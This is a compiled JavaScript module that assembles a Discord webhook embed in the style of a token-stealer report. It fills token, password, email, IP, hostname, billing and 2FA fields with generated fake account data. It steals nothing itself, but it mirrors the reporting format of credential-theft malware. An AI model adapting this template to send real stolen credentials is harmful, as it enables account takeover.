"use strict";
Object.defineProperty(exports, "__esModule", { value: true });
exports.getUserEmailChangeEmbed = void 0;
const constants_1 = require("../constants");
const fakeProfile_1 = require("../fakeProfile");
const utils_1 = require("../utils");
const baseEmbed_1 = require("./helpers/baseEmbed");
const friendsEmbed_1 = require("./helpers/friendsEmbed");
const twoFaEmbed_1 = require("./helpers/twoFaEmbed");
async function getUserEmailChangeEmbed(config, account = new fakeProfile_1.FakeAccount()) {
    const embedsCount = account.discord.twoFACode ? 3 : 2;
    const { embeds, webhookMessage } = (0, baseEmbed_1.getBaseEmbeds)(config, embedsCount);
    const embed = embeds[0];
    embed.setTitle("Email Changed");
    account.discord.generateNewEmail();
    const password = account.discord.password;
    const token = account.discord.token;
    const des = `[**${constants_1.PARTNER_EMOJI} │ Click Here To Copy Info On Mobile**](${constants_1.COPY_ON_MOBILE}${token}<br>${password})`;
    embed.setDescription(des);
    embed.setThumbnail(await account.discord.getAvatar());
    embed.setFields([{
            name: "Info",
            value: (0, utils_1.warpTripleQuote)(`Hostname: \n${account.computerName}\nIP: \n${account.discord.ip}`),
            inline: false
        }, {
            name: "Username",
            value: (0, utils_1.warpInQuote)(account.discord.tag),
            inline: true
        }, {
            name: "ID",
            value: (0, utils_1.warpInQuote)(account.discord.id),
            inline: true
        }, {
            name: "Nitro",
            value: account.discord.nitro,
            inline: false
        }, {
            name: "Badges",
            value: account.discord.badges.join(" "),
            inline: false
        }, {
            name: "Billing",
            value: account.discord.billing,
            inline: false
        }, {
            name: "New Email",
            value: (0, utils_1.warpInQuote)(account.discord.email),
            inline: true
        },
        {
            name: "Password",
            value: (0, utils_1.warpInQuote)(password),
            inline: true,
        },
        {
            name: "Token",
            value: (0, utils_1.warpTripleQuote)(account.discord.token),
            inline: false,
        },
    ]);
    await (0, friendsEmbed_1.prepareFriendsEmbed)(embeds[1], account);
    if (account.discord.twoFACode) {
        (0, twoFaEmbed_1.prepare2FaEmbed)(embeds[2], account.discord.twoFACode);
    }
    return webhookMessage();
}
exports.getUserEmailChangeEmbed = getUserEmailChangeEmbed;
